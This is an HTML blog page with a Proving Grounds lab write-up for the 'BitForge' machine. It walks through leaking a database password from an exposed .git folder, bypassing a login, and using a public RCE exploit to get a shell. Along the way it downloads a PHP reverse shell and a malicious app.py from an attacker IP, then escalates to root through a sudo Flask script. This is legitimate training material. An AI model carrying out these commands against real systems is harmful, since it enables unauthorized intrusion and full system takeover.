<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Matthew Castro - Blog</title>
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
        type="text/css" />
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
        rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="../../css/styles.css" rel="stylesheet" />
    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
    <link rel="preload" as="image" href="/assets/img/posts.jpg">
</head>

<body>
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Page Header-->
    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="post-heading">
                        <h2>BitForge - Proving Grounds Write-up</h2>
                        <span class="meta">
                            Posted on January 15th, 2026
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Post Content-->
    <article class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <p>We start by obtaining the password for the publicly exposed MySQL instance by downloading the exposed .git repository on port 80 and reading the logs.
                        <p></p>
                        <span class="grey-line">wget --mirror -I .git http://bitforge.lab/.git/  </span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/1.png" alt="..." />
                        <p></p>
                        <span class="grey-line">git log</span>
                        <p></p>
                        <span class="grey-line">git show 18833b811e967ab8bec631344a6809aa4af59480</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/2.png" alt="..." />
                        <p></p>
                    </p>
                    <p>
                       We then log in to the database and obtain the hash and key of the user admin
                        for the Simple Online Planning service. If we read this blogpost: 
                        <a href="https://blog.quarkslab.com/pwn-everything-bounce-everywhere-all-at-once-part-2.html" target="_blank"><u>https://blog.quarkslab.com/pwn-everything-bounce-everywhere-all-at-once-part-2.html</u></a>,
                          we find that the login page is vulnerable to SQLi. We can bypass the authentication logic by logging in with the key|hash values as the password. 
                    </p>
                        <p></p>
                        <p></p>
                        <span class="grey-line">mysql -h 192.168.245.186 -u BitForgeAdmin -p --disable-ssl</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/3.png" alt="..." />
                        <p></p>
                        We log in and change the admin password to Password123.
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/4.png" alt="..." />
                        <p></p>                    
                        We obtain a reverse shell as www-data by exploiting CVE-2024-27115 (EDB-ID 52082).
                         We use the RCE vulnerability to transfer a php reverse shell in the /var/www/bitforge.lab/public_html/rev.php directory of the website. 
                        <p></p>
                        <span class="grey-line">python3 52082.py -t http://plan.bitforge.lab/www/ -u admin -p Password123</span>
                        <p></p>
                        <span class="grey-line">wget http://192.168.45.239/rev.php -O /var/www/bitforge.lab/public_html/rev.php</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/5.png" alt="..." />
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/6.png" alt="..." />
                        <p></p>
                        We obtain a shell after visiting the uploaded file address on the website.
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/7.png" alt="..." />
                        <p></p>
                        We then notice an SQL dump file in a folder named backup in /opt. We assume a job is
                         running as a backup. We watch for any credentials being passed in commands using pspy and
                          find credentials for user jack. We log in as the user with the su command.
                        <p></p>
                        <span class="grey-line">wget http://192.168.45.239/pspy64</span>
                        <p></p>
                        <span class="grey-line">chmod +x pspy64</span>
                        <p></p>
                        <span class="grey-line">./pspy64</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/8.png" alt="..." />
                        <p></p>
                        <span class="grey-line">su jack</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/9.png" alt="..." />
                        <p></p>
                        We then check what commands we are allowed to run as sudo. We find "(root) NOPASSWD: /usr/bin/flask_password_changer" in the result.
                        <p></p>
                        <span class="grey-line">sudo -l</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/10.png" alt="..." />
                        <p></p>
                        If we print the contents of the script we are allowed to run as root, we find that it is first entering
                        the /opt/password_change_app directory which we control and then running flask.
                        <p></p>
                        <span class="grey-line">cat /usr/bin/flask_password_changer</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/11.png" alt="..." />
                        <p></p>
                         We change the app.py file to a reverse shell script, run the command and visit the /reverse_shell
                          endpoint at localhost port 9000 to obtain a root shell.  The reverse shell script is a slightly 
                          modified version of the script found here: <a href="https://freelancepentest.com/2025/02/20/a-simple-reverse-shell-in-flask/" target="_blank"><u>https://freelancepentest.com/2025/02/20/a-simple-reverse-shell-in-flask/</u>.</a>
                        <p></p>
                        <span class="grey-line">mv app.py app.old</span>
                        <p></p>
                        <span class="grey-line">wget http://192.168.45.239/app.py</span>
                        <p></p>
                        <span class="grey-line">sudo /usr/bin/flask_password_changer</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/12.png" alt="..." />
                        <p></p>
                        <span class="grey-line">curl 127.0.0.1:9000/reverse_shell</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/bitforge/13.png" alt="..." />






                </div>
            </div>
        </div>
    </article>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>


</html>
